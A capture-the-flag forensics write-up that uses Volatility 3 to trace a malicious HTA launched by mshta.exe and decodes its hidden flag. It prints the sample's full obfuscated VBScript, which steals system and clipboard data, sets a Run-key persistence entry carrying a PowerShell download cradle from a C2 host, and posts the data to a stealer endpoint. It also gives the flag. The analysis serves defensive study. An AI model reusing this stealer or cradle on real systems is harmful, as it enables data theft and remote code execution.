**Writeup author: Oslolosen**

_Use the same memory dump from Phantom Phish._ _The malware appears to be highly sophisticated. What could be its functionality?_

In this task, further investigation into the malware infecting the machine seems to be the objective, as suggested by the task description. During the previous analysis, suspicions were already raised about `heis.hta`.
```sh
vol3 -f dump.dmp windows.cmdline
	#Most valuble output
5696 mshta.exe "C:\Windows\system32\mshta.exe" http://192.168.88.130/heist.hta
```

This command output shows that `mshta.exe` executed an external HTA script. Based on experience, HTA files are often significant, as these types are frequently use them to inject malicious code in CTF-tasks. Further investigation in the process tree confirms if it was executed.
```sh
vol3 -f dump.dmp windows.pstree | grep -C 5 "mshta"
* 5368	628	userinit.exe	0xc50ce4455340	0	-	1	False
** 5416	5368	explorer.exe	0xc50ce4457340	83	-	1	False
*** 8200	5416	SecurityHealth	0xc50ce4b5b0c0	6	-	1	False
*** 10348	5416	powershell.exe	0xc50ce4d590c0	13	-	1	False
**** 5696	10348	mshta.exe	0xc50ce6975080	11	-	1	False
**** 6460	10348	conhost.exe	0xc50ce801c080	3	-	1	False
*** 8372	5416	msedge.exe	0xc50ce0f8a340	59	-	1	False
**** 7968	8372	msedge.exe	0xc50ce5c98080	17	-	1	False
**** 7836	8372	msedge.exe	0xc50ce45b5080	10	-	1	False
**** 9984	8372	msedge.exe	0xc50ce5c5c080	16	-	1	False
```

The presence of `mshta.exe` with the same PID in the process tree confirms that it was active. Now it is time to locate the potentially malicious file. From the previous task, I saved the output from `filescan`, so I checked if the file was present in memory.
```sh
cat filescan.txt | grep "heist"
0xc50ce994a580 \Users\Benjamin\AppData\Local\Microsoft\Windows\INetCache\IE\0RH8WS85\heist[1].hta
```

The output indicates that the file is located at `\Users\Benjamin\AppData\Local\Microsoft\Windows\INetCache\IE\0RH8WS85\heist[1].hta`, at the memory address `0xc50ce994a580`. With the address collected, the file can be dumped and examined. The code is somewhat difficult to read due to the simplistic variable names.
```sh
vol3 -f dump.dmp windows.dumpfiles --virtaddr 0xc50ce994a580
Volatility 3 Framework 2.5.2
Progress:  100.00		PDB scanning finished                                
Cache	FileObject	FileName	Result

DataSectionObject	0xc50ce994a580	heist[1].hta	file.0xc50ce994a580.0xc50ce6625910.DataSectionObject.heist[1].hta.dat
SharedCacheMap	0xc50ce994a580	heist[1].hta	file.0xc50ce994a580.0xc50ce5610950.SharedCacheMap.heist[1].hta.vacb
```

```vbscript
<script language="VBScript">
Dim a1, a2, a3, a4, a5, a6, d2
Set a1 = CreateObject("WScript.Shell")
a2 = a1.RegRead(utr("484b4c4d5c534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c50726f647563744e616d65"))
a3 = a1.ExpandEnvironmentStrings(utr("25434f4d50555445524e414d4525"))
a4 = a1.ExpandEnvironmentStrings(utr("25555345524e414d4525"))
a5 = a1.ExpandEnvironmentStrings(utr("2550524f434553534f525f41524348495445435455524525"))
a6 = dsf()
Dim b1, b2, b3
b1 = utr("535556594943684f5a58637454324a715a574e304945356c644335585a574a4462476c6c626e51704c6b5276643235736232466b553352796157356e4b434a6f64485277637a6f764c32686c62476c3463475633644756796332566a636d5630597a49755a5842304c32746c5a58424259324e6c63334e4a5a6b4e76626d356c593352706232354d62334e304c6e427a4d534970")
b2 = utr("484b43555c536f6674776172655c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e5c")
b3 = utr("4d6963726f736f6674204564676520496e7465677269747920436865636b6572")
a1.RegWrite b2 & b3, b1, "REG_SZ"
iolo()
Dim dtg
dtg = "5667474c4b0761534c54614e63432368700722594c40275b7f0467687b04220267166e"
d2 = hbr(dtg, &H1337)
dfg a2, a3, a4, a5, a6, d2
Function dsf()
	' "hopefully I find some wallet keys"
Dim clipboard, ert
Set clipboard = CreateObject("htmlfile")
ert = clipboard.ParentWindow.ClipboardData.GetData(utr("54657874"))
If Len(data) > 0 Then
dsf = data
Else
dsf = utr("4e6f20636c6970626f617264206461746120666f756e64")
End If
End Function
Sub olo(min)
Dim ts
Dim tss
ts = Timer()
tss = 0
Do While tss < (min * 60)
tss = Timer() - ts
If tss < 0 Then tss = tss + 86400
CreateObject("WScript.Shell").AppActivate("shh")
Loop
End Sub
Sub iolo()
olo 5
End Sub
Sub dfg(os, computer, user, arch, clipboard, d2)
Dim xmlhttp, iop, data
data = "os=" & os & "&computer=" & computer & "&user=" & user & "&arch=" & arch & "&clipboard=" & clipboard & "&misc=" & d2
iop = utr("68747470733a2f2f68656c697870657774657273656372657463322e6570742f737465616c65722e706870")
Set xmlhttp = CreateObject(utr("4D53584D4C322E536572766572584D4C48545450"))
xmlhttp.open "POST", iop, False
xmlhttp.setRequestHeader "Content-Type", "application/x-www-form-iopencoded"
xmlhttp.send data
End Sub
Function hbr(juo, xorKey)
Dim i, yka, yty, keyByte
yka = ""
For i = 1 To Len(juo) Step 2
yty = CLng("&H" & Mid(juo, i, 2))
If (i Mod 4) = 1 Then
keyByte = (&H13)
Else
keyByte = (&H37)
End If
yty = yty Xor keyByte
yka = yka & Chr(yty)
Next
hbr = yka
End Function
Function utr(jui)
Dim i, fgg
fgg = ""
For i = 1 To Len(jui) Step 2
fgg = fgg & Chr(CLng("&H" & Mid(jui, i, 2)))
Next
utr = fgg
End Function
</script>
```
The code shows extensive VBScript containing significant hex data. The `utr` function translates the hex data into ASCII text. Pasting the hex data into CyberChef reveals its contents. For example, `b1` contains the command `IEX (New-Object Net.WebClient).DownloadString("https://helixpewtersecretc2.ept/keepAccessIfConnectionLost.ps1")`, which downloads a PowerShell script. Other variables also contain suspicious text.

The variable `dtg` stands out because it isn't processed by `utr`. Decoding the hex data only results in gibberish. The `dtg` variable is passed to the `hbr` function, which applies an XOR operation with a key.
```vbscript
##CODE
d2 = hbr(dtg, &H1337)

###CODE
Function hbr(juo, xorKey)
Dim i, yka, yty, keyByte
yka = ""
For i = 1 To Len(juo) Step 2
yty = CLng("&H" & Mid(juo, i, 2))
If (i Mod 4) = 1 Then
keyByte = (&H13)
Else
keyByte = (&H37)
End If
yty = yty Xor keyByte
yka = yka & Chr(yty)
Next
hbr = yka
End Function
Function utr(jui)
```

To decode `dtg`, a simple Python script was written that revealed the flag:
```python
dtg = "5667474c4b0761534c54614e63432368700722594c40275b7f0467687b04220267166e"

def xor_decode(encoded_str, xor_key):
	decoded = ""

	for i in range(0, len(encoded_str), 2):
		char_code = int(encoded_str[i:i+2], 16)
		key_byte = 0x13 if (i // 2) % 2 == 0 else 0x37
		decoded += chr(char_code ^ key_byte)
	return decoded

decoded_dtg = xor_decode(dtg, 0x1337)
print("Flag:", decoded_dtg)
```

**FLAG: EPT{X0rd_crypt0_c01n_w4ll3t_h315t!}**
